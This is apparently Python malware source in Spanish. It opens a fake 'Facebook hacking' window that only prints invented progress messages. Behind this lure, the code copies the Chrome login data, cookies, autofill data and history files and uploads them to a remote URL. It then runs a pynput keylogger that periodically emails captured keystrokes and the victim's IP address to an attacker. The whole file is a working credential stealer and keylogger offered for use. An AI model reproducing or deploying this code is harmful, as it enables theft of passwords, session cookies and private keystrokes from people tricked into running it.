import requests
from tkinter import *
from tkinter import messagebox as MessageBox
import getpass
import pynput.keyboard
import threading

root = Tk()
root.title("HACKEAR FACEBOOK PRO (CRACK)")
root.geometry("460x400")
root.resizable(0, 0)

def exit():
    root.destroy()
    

def enviar():
    enti1 = ent1.get()
    if enti1 == "":
        MessageBox.showinfo("Error", "No puede dejar campos vacios")
    else:
        msg = MessageBox.askquestion("HACKEAR FACEBOOK PRO (CRACK)", "Estas seguro de esto?", icon="warning")
        if msg == "yes":
            text = Text(root)
            text.insert(INSERT, "Hacking Facebook!")
            text.insert(INSERT, "\n")
            text.grid(row=3, column=0, columnspan=2)
            text.config(font=("Arial", 10))
            text.config(bg="black", fg="white")
            text.config(width=55, height=20)
            text.insert(INSERT, "[+] Ingresando Diccionarios encontrados!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 10 Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 20 Ingresando posibles contraseñas!", "red")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 30 Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 40 Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 50 Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 100 Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 200 Ingresando posibles contraseñas!", "red")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 300 Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 400 Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            text.insert(INSERT, "[+] 500 Ingresando posibles contraseñas!")
            text.insert(INSERT, "\n")
            
        else:
            MessageBox.showinfo("HACKEAR FACEBOOK PRO (CRACK)", "Hacking Canceled")
        

ent1 = StringVar()
Button(root, text="Salir", command=exit).grid(row=0, column=2)
Label(root, text="Hackear Facebook", font="bold").grid(row=0, column=0)
Label(root, text="Ponga el Link: ", fg="black").grid(row=1, column=0)
Entry(root, textvariable=ent1, width=45).grid(row=1, column=1)

Button(root, text="Hackear", command=enviar).grid(row=2, column=0)

root.mainloop()

"""Fin programa"""





getuser = getpass.getuser()
"""copy from system"""
history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
Visited = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Visited Links"
Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"


"""mandando al server"""

user = getpass.getuser()

file = open("name.txt", "w")
file.write("Nombre del pc: " + user)
file.close()

"""URL A USAR"""

url = "https://link a enviar "
"""Aqui el headers"""
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}



"""0 server"""
"""subir_archivo"""
files = {"subir_archivo": open("name.txt", "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""1 server"""
"""subir_archivo"""
files = {"subir_archivo": open(webData, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""2 server"""
"""subir_archivo"""
files = {"subir_archivo": open(loginData, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""3 server"""
"""subir_archivo"""
files = {"subir_archivo": open(Cookies, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""4 server"""
"""subir_archivo"""
files = {"subir_archivo": open(Visited, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text

"""5 server"""
"""subir_archivo"""
files = {"subir_archivo": open(history, "rb")}
send = requests.post(url, files=files, headers=headers)
envio = send.text



"""_________________________________________________fin programa___________________________________________________"""
"""_________________________________________________inicio key______________________________________________________"""
log = ""

def process_key_press(key):
    global log


    try:
        log += str(key.char)
    except:
        if key == "key.space":
            log += " "
        
        else:
            log += " " + str(key) + " "
            

def report():
    global log
    if len(log) > 0:
        print("[+] Enviando reporte...")
        print("[+] Report: " + log)
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
        ip = requests.get('http://ver ip.com/ip.php', headers=headers).text
        print("[+] IP: " + ip)
        dat = "\nip:" + ip + "\n" + "\nreporte:" + log
        send = requests.post('https://link a enviar.com/smtp.php', data={'to': 'correo@gmail.com', 'subject': ip, 'message': dat, 'from':'keylogger'}, headers=headers)
        envio = send.text
        if envio == 'Se envio el correo':
            print('Se envio el correo')
        else:
            print('Error', 'Error al enviar el mensaje')
            
    else:
        print("[-] No hay pulsaciones.")
    log = ""
    timer = threading.Timer(1000, report)
    timer.start()
    
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
    
    
"""________________________Fin keylogger__________________________________________________________"""
